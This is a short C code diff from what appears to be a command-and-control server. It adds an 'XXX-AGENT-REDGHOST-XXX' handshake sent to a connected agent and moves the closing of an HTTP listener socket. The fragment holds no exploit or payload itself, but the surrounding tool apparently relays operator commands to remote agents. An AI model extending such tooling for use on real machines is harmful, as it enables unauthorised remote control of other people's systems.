@@ -74,6 +74,10 @@ int main() {
                 puts("Preparing HTTP listener");
                 http_listener_accept = http_listener(http_listener_socket);
                 
+                char agent_connected[] = "XXX-AGENT-REDGHOST-XXX";
+                if (send(inferno_accept, agent_connected, sizeof(agent_connected), 0) == -1)
+                    error("Error sending to client");
+
                 //agent is connected to server
                 puts("Agent connected");
                 status = "ok";
@@ -101,15 +105,15 @@ int main() {
                     error("Error sending to client");
                 printf("Sending to client: %s\n", response);
                 puts("===========END PAYLOAD===========\n");
+            
+                // close HTTP accept
+                close(http_listener_accept);
             }
             //sending to client
             printf("Sending to client: %s\n", input);
             if (send(inferno_accept, input, sizeof(input), 0) == -1)
                 error("Error sending to client");
         }
-
-        // close HTTP accept
-        //close(http_listener_accept);
 
         //close accept
         close(inferno_accept);
